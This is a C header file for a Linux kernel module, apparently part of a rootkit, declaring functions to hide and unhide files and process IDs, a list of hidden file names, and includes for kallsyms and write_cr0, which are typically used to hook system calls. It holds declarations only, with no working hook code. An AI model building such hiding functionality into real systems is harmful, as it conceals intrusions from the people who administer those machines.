#ifndef _HOOKS_H
#define _HOOKS_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <asm/paravirt.h> // write_cr0
#include <linux/list.h>

extern struct list_head list_files;
//LIST_HEAD macro can't be used because we need to declare it as extern

struct list_files_node{
	struct list_head list; // prev and next
	char* name;
};

int hide_file(const char* name);
int unhide_file(const char* name);

int hide_pid(int pid);
int unhide_pid(int pid);


int __init hooks_init(void);
void __exit hooks_exit(void);

#endif
